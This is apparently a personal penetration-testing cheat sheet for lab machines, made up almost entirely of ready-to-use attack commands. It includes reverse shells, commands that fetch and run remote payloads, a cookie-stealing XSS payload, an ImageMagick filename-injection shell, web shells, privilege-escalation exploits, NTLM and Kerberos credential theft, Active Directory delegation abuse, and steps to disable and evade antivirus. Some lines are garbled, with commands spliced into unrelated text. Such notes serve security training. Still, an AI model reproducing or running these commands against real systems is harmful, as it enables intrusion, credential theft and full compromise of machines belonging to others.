snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.25.4.2.1.2  # Enumerate running processes
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.25.6.3.1.2  # Enumerate installed software/packages
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.25.2   # Enumerate filesystem information
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.25.4   # Enumerate running services
snmpwalk -c public -v1 192.168.236.149 .1.3.6.1.2.1.25.1   # Enumerate system users

Reverse shell:
.\nc.exe 192.168.45.223 443 -e cmd.exe  \\from windows using nc.exe
nc -nv 192.168.189.42 31337   \\revrshell from a socket using netcat
curl -X POST — data "code=os.system('nc -e /bin/bash 192.168.45.153 21')" http://192.168.163.117:50000/verify   \\using curl with vulnerable parameter, in this case it is "code"

Linux priv exe using dirt pipe:
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/README.md  \\download exploit-2.c
Tranfer to target linux host
compile it is using gcc -o exploit exploit-2.c
find / -perm -u=s -type f 2>/dev/null   \\then find suid
./exploit /usr/bin/mount  \\change the suid binary accordingly

Command to execute for privlege linux privilege escalation for jdwp vulnerability:
proxychains python2.7 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd "/bin/busybox nc 192.168.45.250 443 -e /bin/bash"   \\use proxy chains if it is port forwarded using chisel.

Catch NTLMv2-SSP Hash with responder:
sudo responder -I tun0     \\start a responder
check smb server is on
dir \\192.168.119.2\test   \\ ip- kali, In target machine if you got a shell Then if you got a shell
///192.168.45.160/test/     \\ip-kali, if you have vulnerable parameter which redirect enter there
then check the responder wheather it cathed the NTLMv2 hash.
hashcat --help | grep -i "ntlm"  \\check for hashcat mode
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force   \\then crack it with hashcat
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
Powershell:
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"  \\check powershell history

convert c to exe: adduser
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

For wildcard Privilege escalation:https:
//www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/     \\follow the instuction in the blog

ssh key generation:
ssh-keygen
enter passpharse if you want
cp /home/yourusername/.ssh/id_rsa.pub authorized_keys  \\put your public key in authorized key and tansfer it to target machine's home/user/.ssh
then login with your id_rsa via ssh with targerget usernmae and ip

File upload vuln:
If the extention is not allowed, use the below way
echo "AddType application/x-httpd-php .dork" > .htaccess   \\create a .htaccess file with the given content
then uplod this to the target website
and now upload your reverse shell withe filename.dork extenstion
Then navigate to uploads directory in the website then click yor reverse shell payload to trigger a revershell, simultaneouly satrt netcat listener

If you Have SeManageVolumePrivilege:
You can get read and write access to windows\system32, then we can hijack binaries
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
get the .exe from:https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
and tranfer to target system
Then execute: .\SeManageVolumeExploit.exe
Now you will have full access to C:\windows\system32
Now goto C:\windows\system32\wbem and create a .dll payload 
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=443 -f dll -o tzres.dll
then move to the \wbem directory
and enter "systeminfo" to trigger it
simultaneously start a netcat listener on port 443
Now you are an NT/authority

nc.exe reverse shell:
nc.exe 192.168,45.240 443 -e cmd

Mssql queries:
This query will add uploader.php in the \www directory, the we can use that to upload our reverse shell
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';

LFI:
For windows
http://192.168.151.53:4443/site/index.php?page=../../../../../../../../windows/win.ini
http://192.168.151.53:4443/site/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
http://192.168.151.53:4443/site/index.php?page=../../../../../../../../windows/win.ini%00
For linux:
../etc/passwd
../etc/hosts

RFI:
http://192.168.151.53:4443/site/index.php?page=http://192.168.45.240/rev.php

PHP code to get revrse shell and upload a file as well:
<?php
// Download the reverse shell executable
$download = system('certutil.exe -urlcache -split -f http://192.168.49.178/reverse.exe reverse.exe');

// Execute the downloaded reverse shell executable
$exec = system('reverse.exe');
?>

windows interactive use: powershell
set PATH=%SystemRoot%\system32;%SystemRoot%;

Look for:
PaperStream IP in windows for PE

Nmap Scripts:
Ldap port 389:
--script "ldap* and not brute" 
--script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"'
--script ldap-rootdse
--script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,ldap.qfilter=users,ldap.attrib=sAMAccountName'
--script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}'
smb port 139,445:
--script smb-vuln*
--script smb-enum-shares.nse
--script smb-enum-users.nse
snmp port 161:
--script *snmp*
krb 88:
--script krb5-enum-users --script-args krb5-enum-users.realm='test'

ldapsearch:
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.189.122" "(objectclass=*)"  \\change domain accordingly
If you find any creds, then try 
cadaver http://192.168.142.122   \\change ip accordingly, use samaccount username and passowrd to get shell,then upload reverse shell or cmdasp.aspx

SSRF vuln:
SSRF Leading To Retreiving Username And NTLMv2 Hash Through Responder
responder -I tun0 -wv     \\just turn your responder On
http://192.168.45.242:80   \\and forward this url with your kali ip to port 80 to catupe the ntlmv2 hash

GMSA password reader:
./gmsa.exe --accountname 'svc_apache'  \\change service account name accordingly, for this to works you to own a user who is part of web admins group.

utilman.exe: with SeRestorePrivilege
ren cmd.exe Utilman.exe    \\if you have access to utilman.exe, change it to cmd.exe by running this command
then do rdp to the ip and press "win+u" on rdp session's login page, you will get nt/authority shell access

Always install elevated privilege escalation on windows:
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
if this set to one then we can run .msi files
So generate a reverse shell payload in .msi extenstion and execute it in windows shell
cath revershell using netcat listener

Argus Surveillance DVR: directory tarversal
curl "http://192.168.189.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="  \\view \windows\win.ini
curl "http://192.168.189.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="   \\change user name accordingly, in this case the user is Viewer and get id_rsa, then ssh into the machine

rsync port 873:
rsync 192.168.1.171::   \\change ip accordingly
rsync 192.168.1.171::files    \\change "files" name aCCordingly,  this command will lis sub directories
rsync -r 192.168.1.171::files/tmp/     \\change files name accordingly, this command will kist sub directory of files recursively
rsync 192.168.1.171::files/home/test/mypassword.txt .   \\downlaod a file 
The below steps is to add our idrsa.pub to the target, to login through ssh without password:
mkdir fox  \\here fox is the user name, change name accordingly
cd fox
mkdir .ssh
cd .ssh
touch id_rsa.pubhttp://192.168.163.64:8003
ssh-keygen -t rsa
[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] “/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub”
[Enter passphrase (empty for no passphrase):] “password”
[Enter same passphrase again:] “password”
sudo mv id_rsa_pub authorized_keys
cd ..
rsync -avp fox/ fox@192.168.120.149::fox/

Git:
git log
git show
git commit
git config --global user.name "name"   \\add name to git
git config --global user.email "kashz"   \\add email to git
git commit -m "name"   \\commit the changes

Git vis SSH:
GIT_SSH_COMMAND='ssh -i id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.189.125:/git-server/     \\to clone to out local kali machine
GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push -u origin   \\push the changes 

User enum:
ident-user-enum 192.168.163.60 22 113 5432 8080 10000  \\change ip and port accordingly

To write a file in lunux, when have no editorssh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)": EOT
cat <<'EOT'> /etc/systemd/system/pythonapp.service  \\change the path to the filename accordingly

Redis exploit:
if the version is below or equal to 5.0.0 follow below steps
get https://github.com/n0b0dyCN/redis-rogue-server and run the python file
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>  \\command
it will ask you for interactive shell or reverse shell, choose aCCordingly
Now above version 5.0.5
follow https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
just make the file and get module.so file and put it in the place where it has to be
Then run the following commands
redis-cli -h 192.168.163.93  \\change ip aCCordingly
MODULE LOAD /var/ftp/pub/module.so   \\lod the .so file and change path aCCordingly
system.exec "id"  \\this will execute the command then we can use this rce and get reverse shell
system.exec "bash -i >& /dev/tcp/192.168.45.153/22 0>&1"   \\get reverse shell by listeninng on port 22
If you have password for Redis get the python exploit from:https://github.com/Ridter/redis-rce/blob/master/redis-rce.py
python3 redis-rce.py -r 192.168.163.166 -p 6379 -L 192.168.45.153 -P 22 -v -f module.so -a "Ready4Redis?"  \\if you have password for redis, can check for passwords in /etc/redis/redis.conf

TAR: If you have tar file in cron jobs
# 1. Create files in where the cron job directory called
# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh sudo.sh'

# 2. Create a privesc.sh bash script, that allows for privilege escalation
#malicous.sh:
echo 'user ALL=(root) NOPASSWD: ALL' > /etc/sudoers

#The above injects an entry into the /etc/sudoers file that allows the 'kali' 
#user to use sudo without a password for all commands
#NOTE: we could have also used a reverse shell, this would work the same!
#OR: Even more creative, you could've used chmod to changes the permissions
#on a binary to have SUID permissions, and PE that way

WP Scan:
wpscan --url http://192.168.200.105 -e p,t
wpscan --url http://192.168.200.105 --enumerate p --plugins-detection aggressive
wpscan --url http://example.com --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive   

SMTP:
OpenSMTPD version 6.6.1
OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py
python3 exp.py 192.168.200.71 25 'wget 192.168.45.153/passwd -O /etc/passwd'  \\in between the single qoute, we can enter our command

What after root: ROOT
if you got root access but still not get proof.txt you just have local.txt, the you can do the below
fdisk -l  \\Using the command we can list the hosts disks
output for above command will be some thing like the below:
root@0873e8062560:/# fdisk -l
fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x16939df4
Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 37750783 37748736  18G 83 Linux
/dev/sda2       37752830 41940991  4188162   2G  5 Extended
/dev/sda5       37752832 41940991  4188160   2G 82 Linux swap / Solaris

Then mount it:
mkdir /mnt/own
mount /dev/sda1 /mnt/own    \\here intead of /dev/sda1 enter the disk
cd /mnt/own  \then list "ls" and navigate to the rrot directory or the directory you need.

MSSQL:
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.76.222 -windows-auth   \\change username accordingly and enter password when promted
enable xp_cmdshell
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; iwr -uri http://10.10.14.83/nc.exe -outfile nc.exe"  \\to download a nc.exe from our kali machine
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.14.83 445"   \\for revershell

grep:
cat * | grep -i passw*

Image magic identifier:
cp SecSignal.jpg "$(echo '|smile`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yMjkvNDQzIDA+JjE= | base64 -d | bash`'.jpg)"  \\change base64 revershell code accordingly

ffuf enum: Sub Domains
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://192.168.217.237 -H 'Host: FUZZ.192.168.217.237' -fs 868   \\enum subdomains
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18   \\enumrate sub domains
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949  \\use this -fs to filter the response code which is repaeating.

Joomla Enum:
joomscan -url http://192.168.217.79/joomla -ec   \\info gathering of joomla website
nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=cewl.list,http-joomla-brute.hostname=192.168.217.79,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.thread=3' 192.168.217.79    \\brute force using nmap

Generate passwords or list using clew:
cewl $URL -w cewl.list  \\you can change name of the list accordingly

Resource Based Constrained Delegation Attack: Active Directory (SeMachineAccountPrivilege Enabled)
First add computer to the domain using valid privileged user 
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Then set proper delegationg rights using the python script 
impacket-rbcd -dc-ip 192.168.x.x -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone  \\if you have ntlm hash use this
impacket-rbcd -action write -delegate-from pwned$ -delegate-to dc$ -dc-ip 10.10.11.5 "freelancer.htb/lorra199:PWN3D#l0rr@Armessa199"  \\if you have password use this 
And, use impacket-getST impersonate admin using ticket
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x
once ticket created, save it in export
export KRB5CCNAME=./Administrator.ccache  \\change the .cache file accordingly
Finally use psexec to connect as user without password
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x   \\change the hostname accordingly, if it not able to resolve, add the hotname to /etc/hosts

PHP wrapper and ZIP wrapper:
php://filter/convert.base64-encode/resource=index  \\change the .php file acoordingly, in thicase it is index.php, so it just index, so we can read the source code of the php page
zip wrappers rce: https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38-------------------------------- 

Bruteforce:
hydra -l elly -e nsr ftp://192.168.188.148   \\ftp brute force with just username, this command will try the username reversed versions as passwords, same applies to all services, just change service nmae to ssh or smb 
hydra -l elly -P /path/to/password/list ftp://192.168.188.148   \\this are default, just username and with pasword lists
hydra -l elly -P /path/to/password/list smb://192.168.188.148
hydra -l elly -P /path/to/password/list ssh://192.168.188.148
hydra -L users.txt -e nsr ssh://192.168.188.148  \\user this command when you have user lists, if you have password list use -P parameter

sorting:
cat passwd | awk -F: '{print $1}' > users.txt   \\this command will get all word in 1st field each line from file passwd and put it in users.txt, we can change the value 1 tomother accordingly to define which field of the line and also the 'F:' in here colon seperates the fiedl, ve can change that as well 

Mozilla:
ls .mozilla/firefox/esmhp32w.default-default | grep -E "logins.json|cert9.db|cookies.sqlite|key4.db"  \\if we have .mozilla directory, use this command to get sensitive files and tarnfer it to our locakl kali machine and decrytpt the file using firfox decrypt.py

Switch user:
sudo -u scriptmanager -i  (using sudo)

Ansible
If you got ansible vault hash, we can decrypt using john and ansible_vault tool
First we have to decrypt vault password
ansible2john pwm_admin_login > pwm_admin_login_john  \\chnage the hash file accordingly
john --wordlist=/usr/share/wordlists/rockyou.txt pwm_admin_pass_john   \\we will get vault password
Then we can get the orginal password using the vault password
Install:
pipx install ansible-core
apt install ansible-core
cat pwm_admin_pass | ansible-vault decrypt  \\change hash file accordingly
then enter vault password when prompted

PHP cmd 
<?php echo system($_REQUEST ["cmd"]); ?>

RunasCs.exe
./run.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.6:443

Mangodb:
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler  \chnage username password portnum and database name accordingly

SherLock.ps1:
Find-AllVulns  \\this will give use possible kernal exploits in windows machine

SQLI Reverse Shell
'; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = 'xp_cmdshell') = 1    EXEC master.dbo.xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.2/rev.ps1'')" --

SPN write Access in Active Directory
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/PWNED'}  \\change username and spn accordingly
Get-DomainUser -Identity rsa_4810 | get-domainspnticket -format hashcat
\\this will get you the kerberoast hash, the we can crack it using john or hashcat
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt --force

Changing file permissions with icacls:
icacls root.txt /grant alfred:f \\change username, file name and access accordingly

Sudo permissions
If you sudo permission but as another user, use sudo -u username and put remaining command

Blind xss
<img src=x onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC42OjQ0NDQvP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk="));' 
<img src=x onerror='eval(atob("fetch('http://10.10.14.6:4444/?cookie='+document.cookie)"));' />
<img src=x onerror=fetch("http://10.10.14.6:4444/"+document.cookie);>
<img src="http://[your ip]:[port]";>

EfsPotato: SeImpersonatePrivilege
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
./EfsPotato.exe 'whoami'

To disable AV while you are ADMINISTARTOR (Antivirus)
Set-MpPreference -DisableRealtimeMonitoring $true   \\run this in powershell environment

Evade AV using Metasploit to get reverse shell
msf> use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > set payload windows/x64/meterpreter/reverse_https
msf6 evasion(windows/windows_defender_exe) > set lport 5555
msf6 evasion(windows/windows_defender_exe) > set lhost tun0
msf6 evasion(windows/windows_defender_exe) > run

[*]Compiled executable size: 4608
[+] cop.exe stored at /home/kali/.msf4/local/cop.exe

transfer the cop.exe to the target windows box

msf6 evasion(windows/windows_defender_exe) > handler -p windows/x64/meterpreter/reverse_https -H 0.0.0.0 -P 5555

execute the cop.exe in the target windows box for the meterpreter session


Psexec session to stable shell
.\PsExec.exe \\DC01.ghost.htb -c powershell -c "ls c:\; iwr 10.10.x.x/nc64.exe -o c:\temp\nc.exe; c:\temp\nc.exe 10.10.x.x PORT -e powershell"

.exe to .lnk
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("c:\Common Applications\Notepad.lnk")
$lnk.TargetPath = "c:\xampp\htdocs\met.exe"
$lnk.Save()

.kdbx
 keepassxc file.kdbx
 Also While cracking keepass hash using hashcat remove the username in the beginning of the hash.
```